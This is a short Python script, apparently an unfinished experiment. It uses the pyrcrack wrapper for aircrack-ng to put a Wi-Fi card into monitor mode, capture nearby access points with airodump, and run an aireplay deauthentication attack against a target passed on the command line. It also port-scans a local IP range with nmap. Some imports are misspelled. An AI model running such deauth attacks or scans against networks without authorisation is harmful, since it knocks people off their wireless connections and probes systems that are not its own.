import pyrcrack
import nmap
import sys
import asyncio
from async_timeout import timeout
from contextlin import suppress



def runNmap(ip):
    # ip = '10.202.208.1'
    ports = '30'
    nm = nmap.PortScanner()
    nm.scan(ip, ports)
    print("scan info")
    print(nm.scaninfo())
    print("")
    print("hosts:")
    hosts = nm.all_hosts()
    print(hosts)
    print("")
    print("hostnames:")
    for x in hosts:
        # tempIP = '10.202.208.' + str((x + 1))
        print(nm[x].hostname())

async def attack(interface, apo):
    """Run aireplay deauth attack."""
    async with pyrcrack.AirmonNg() as airmon:
        await airmon.set_monitor(interface['interface'], apo.channel)
        async with pyrcrack.AireplayNg() as aireplay:
            await aireplay.run(
                interface['interface'], deauth=sys.argv[1], D=True)
            print(await aireplay.proc.communicate())


async def deauth():
    """Scan for targets, return json."""
    async with pyrcrack.AirmonNg() as airmon:
        interface = (await airmon.list_wifis())[0]['interface']
        interface = (await airmon.set_monitor(interface))[0]
        print(interface)
        async with pyrcrack.AirodumpNg() as pdump:
            await pdump.run(interface['interface'], write_interval=1)
            while True:
                await asyncio.sleep(3)
                for apo in pdump.sorted_aps():
                    print(type(apo))

        #             await attack(interface, apo)

async def test(max_timeout):
    async with pyrcrack.AirodumpNg() as pdump:
        with suppress(asyncio.TimeoutError):
            async with timeout(max_timeout):
                await pdump.run(sys.argv[1])
                while True:
                    await asyncio.sleep(1)
                    print(pdump.meta)
        return await pdump.proc.terminate()




async def printing():
    async with pyrcrack.AirmonZc() as airmon:
        print(await airmon.list_wifis())

# runNmap('10.202.208.1-30')
asyncio.run(test(10))
# asyncio.run(deauth())
# asyncio.run(printing())